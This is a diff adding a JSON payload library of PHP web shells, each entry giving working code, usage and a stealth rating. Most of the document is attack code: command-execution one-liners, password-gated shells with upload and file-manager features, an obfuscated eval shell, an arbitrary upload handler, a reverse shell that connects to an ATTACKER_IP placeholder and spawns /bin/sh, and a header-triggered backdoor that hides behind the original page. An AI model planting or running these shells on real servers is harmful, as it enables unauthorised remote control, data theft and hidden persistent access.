@@ -1,0 +1,75 @@
+{
+  "simple_shell": {
+    "name": "Simple PHP Shell",
+    "description": "Basic command execution via GET parameter",
+    "code": "<?php system($_GET['cmd']); ?>",
+    "usage": "?cmd=whoami",
+    "stealth": "low"
+  },
+  
+  "advanced_shell": {
+    "name": "Advanced PHP Shell",
+    "description": "Feature-rich shell with file upload, download, and execution",
+    "code": "<?php\nerror_reporting(0);\nsession_start();\n\n$password = 'changeme'; // Change this!\n\nif(isset($_POST['pass']) && $_POST['pass'] == $password) {\n    $_SESSION['authenticated'] = true;\n}\n\nif(!isset($_SESSION['authenticated']) || $_SESSION['authenticated'] !== true) {\n    echo '<form method=\"post\">Password: <input type=\"password\" name=\"pass\"/><input type=\"submit\"/></form>';\n    exit;\n}\n\necho '<html><head><title>Shell</title><style>body{background:#000;color:#0f0;font-family:monospace;}</style></head><body>';\n\n// File upload\nif(isset($_FILES['file'])) {\n    move_uploaded_file($_FILES['file']['tmp_name'], $_FILES['file']['name']);\n    echo 'File uploaded: ' . $_FILES['file']['name'] . '<br>';\n}\n\n// Command execution\necho '<form method=\"post\">Command: <input type=\"text\" name=\"cmd\" size=\"80\" autofocus/><input type=\"submit\" value=\"Execute\"/></form>';\n\nif(isset($_POST['cmd'])) {\n    echo '<pre>';\n    system($_POST['cmd']);\n    echo '</pre>';\n}\n\n// File upload form\necho '<form method=\"post\" enctype=\"multipart/form-data\">Upload: <input type=\"file\" name=\"file\"/><input type=\"submit\" value=\"Upload\"/></form>';\n\n// Current directory\necho '<br>Current dir: ' . getcwd() . '<br>';\necho 'User: ' . get_current_user() . '<br>';\n\necho '</body></html>';\n?>",
+    "usage": "Access via browser, default password: changeme",
+    "stealth": "medium"
+  },
+  
+  "mini_shell": {
+    "name": "Minimal PHP Shell",
+    "description": "Tiny one-liner shell",
+    "code": "<?=`$_GET[0]`?>",
+    "usage": "?0=whoami",
+    "stealth": "high"
+  },
+  
+  "c99_style": {
+    "name": "C99-style Shell",
+    "description": "Feature-rich shell with file manager",
+    "code": "<?php\n// C99-style Shell\n$auth_pass = md5('password');\n\nif(!isset($_SESSION)) session_start();\n\nif(isset($_POST['pass']) && md5($_POST['pass']) == $auth_pass) {\n    $_SESSION['auth'] = true;\n}\n\nif(!$_SESSION['auth']) {\n    echo '<form method=post>Password:<input type=password name=pass><input type=submit value=Login></form>';\n    exit;\n}\n\necho '<html><head><title>Shell</title></head><body bgcolor=black text=green>';\n\n// File manager\nif(isset($_GET['dir'])) {\n    $dir = $_GET['dir'];\n} else {\n    $dir = getcwd();\n}\n\necho '<h3>Directory: ' . $dir . '</h3>';\n$files = scandir($dir);\n\necho '<table border=1><tr><th>Name</th><th>Size</th><th>Perms</th><th>Actions</th></tr>';\nforeach($files as $file) {\n    if($file != '.' && $file != '..') {\n        $filepath = $dir . '/' . $file;\n        $size = filesize($filepath);\n        $perms = substr(sprintf('%o', fileperms($filepath)), -4);\n        echo '<tr><td>' . $file . '</td><td>' . $size . '</td><td>' . $perms . '</td>';\n        echo '<td><a href=?view=' . urlencode($filepath) . '>View</a> | ';\n        echo '<a href=?edit=' . urlencode($filepath) . '>Edit</a> | ';\n        echo '<a href=?del=' . urlencode($filepath) . '>Delete</a></td></tr>';\n    }\n}\necho '</table>';\n\n// Command execution\necho '<form method=post>Command: <input name=cmd size=80><input type=submit value=Exec></form>';\nif(isset($_POST['cmd'])) {\n    echo '<pre>' . shell_exec($_POST['cmd']) . '</pre>';\n}\n\necho '</body></html>';\n?>",
+    "usage": "Full-featured file manager with command execution",
+    "stealth": "low"
+  },
+  
+  "wso_style": {
+    "name": "WSO-style Shell", 
+    "description": "Web Shell by Orb with obfuscation",
+    "code": "<?php\n$O00O0O=urldecode('%66%67%36%73%62%65%68%70%72%61%34%63%6f%5f%74%6e%64');$O00O0O.=urldecode('%78%6c%75%64%73%6b%6a%71%62%61%77%73%65%6f%70%63');$O00O0O=str_replace('x','',str_replace('j','','strj_rexpjlxaxce'));\n$code = $O00O0O(\"sbdefsgthxkjlp\",\"\",\"spassbdefthsrugh\");\nif(isset($_REQUEST['cmd'])) {\n    eval($code($_REQUEST['cmd']));\n}\n?>",
+    "usage": "Obfuscated shell, ?cmd=system('whoami');",
+    "stealth": "high"
+  },
+  
+  "upload_handler": {
+    "name": "File Upload Handler",
+    "description": "Handles file uploads only",
+    "code": "<?php\nif(isset($_FILES['f'])) {\n    $dest = isset($_POST['d']) ? $_POST['d'] : $_FILES['f']['name'];\n    if(move_uploaded_file($_FILES['f']['tmp_name'], $dest)) {\n        echo 'OK: ' . $dest;\n    } else {\n        echo 'FAIL';\n    }\n}\n?>",
+    "usage": "Upload file with POST parameter 'f', optional destination 'd'",
+    "stealth": "medium"
+  },
+  
+  "eval_shell": {
+    "name": "Eval Shell",
+    "description": "Execute arbitrary PHP code",
+    "code": "<?php\nif(isset($_POST['code'])) {\n    eval($_POST['code']);\n}\n?>\n<form method=post>\n<textarea name=code rows=10 cols=80></textarea><br>\n<input type=submit value=Execute>\n</form>",
+    "usage": "Enter PHP code to execute",
+    "stealth": "low"
+  },
+  
+  "reverse_shell": {
+    "name": "PHP Reverse Shell",
+    "description": "Connects back to attacker",
+    "code": "<?php\n// PHP Reverse Shell\n$ip = '{{ATTACKER_IP}}';\n$port = {{ATTACKER_PORT}};\n\n$sock = fsockopen($ip, $port);\n$proc = proc_open('/bin/sh', array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);\n?>",
+    "usage": "Set ATTACKER_IP and ATTACKER_PORT, then access the file",
+    "stealth": "high",
+    "variables": ["ATTACKER_IP", "ATTACKER_PORT"]
+  },
+  
+  "persistent_backdoor": {
+    "name": "Persistent Backdoor",
+    "description": "Creates persistent access mechanism",
+    "code": "<?php\n// Persistent Backdoor\n$key = '{{SECRET_KEY}}';\n\nif(isset($_SERVER['HTTP_X_KEY']) && $_SERVER['HTTP_X_KEY'] == $key) {\n    if(isset($_SERVER['HTTP_X_CMD'])) {\n        echo shell_exec(base64_decode($_SERVER['HTTP_X_CMD']));\n    }\n    exit;\n}\n\n// Normal page behavior\ninclude('original_page.php');\n?>",
+    "usage": "Use X-Key and X-CMD headers (base64 encoded command)",
+    "stealth": "very_high",
+    "variables": ["SECRET_KEY"]
+  }
+}
